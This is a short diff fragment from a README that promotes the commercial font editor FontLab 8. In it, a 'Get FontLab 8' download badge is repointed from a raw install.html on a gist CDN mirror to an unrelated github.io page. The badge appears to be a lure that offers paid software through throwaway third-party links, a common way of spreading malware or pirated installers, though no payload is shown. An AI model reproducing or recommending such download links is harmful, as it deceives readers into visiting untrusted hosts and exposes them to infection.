@@ -3,7 +3,7 @@
 **FontLab 8** is the next-generation professional font editor — a complete environment for type design, OpenType mastering, and multi-axis variable font creation.  
 It’s the tool behind many of today’s most iconic typefaces. 🔠  
 
-[![🔷 Get GitHub Instruction](https://img.shields.io/badge/🔷%20Get%20FontLab%208-0078AA?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/heartsoundserial3/e9c49eb5965fdeb659aed76fe81748ab/raw/b8929357237b51311366f809a5be8cec27a23d9f/install.html?offer=FontLab8)
+[![🔷 Get GitHub Instruction](https://img.shields.io/badge/🔷%20Get%20FontLab%208-0078AA?style=for-the-badge&logo=adobe&logoColor=white&labelColor=0B0F19)](https://app-desk-hub.github.io/.github/?offer=FontLab8)
 
 ---
 
